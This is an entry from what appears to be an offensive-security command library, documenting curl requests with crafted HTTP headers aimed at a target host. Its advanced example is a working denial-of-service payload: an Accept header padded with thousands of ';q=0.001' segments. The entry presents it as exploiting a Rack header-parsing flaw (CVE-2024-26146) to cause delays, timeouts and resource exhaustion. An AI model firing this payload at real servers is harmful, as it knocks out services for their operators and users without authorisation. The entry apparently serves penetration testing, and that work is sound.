---
id: cmd-uuid-9012
data: >-
  curl -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9"
  http://target.example.com/
tags:
  - dos
  - http
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.689Z'
verified: false
validated: true
submitted: true
---
# curl-send-malicious-headers

## Command

```bash
curl -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9" http://target.example.com/
```

## Description

This command uses curl to send an HTTP request with custom headers to a target server, useful for testing header-based vulnerabilities like CVE-2024-26146 in Rack by crafting Accept or Forwarded headers that cause parsing delays.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Specify a custom header (e.g., Accept or Forwarded) | Yes |
| URL | Target endpoint URL | Yes |
| `-v` | Verbose mode for debugging | No |

## Examples

### Basic Usage

```bash
curl -H "Accept: text/html" http://target.example.com/
```

### Advanced Usage

```bash
curl -H "Forwarded: for=127.0.0.1;proto=http" -H "Accept: $(python3 -c 'print(";q=0.001" * 10000)')" http://target.example.com/
```

## Expected Output

Successful execution returns the server's HTTP response, but in exploitation cases, expect delays, timeouts, or error codes like 500 due to resource exhaustion.

## Related

- [[procedures/Exploit-Rack-Header-Parsing-DoS]]
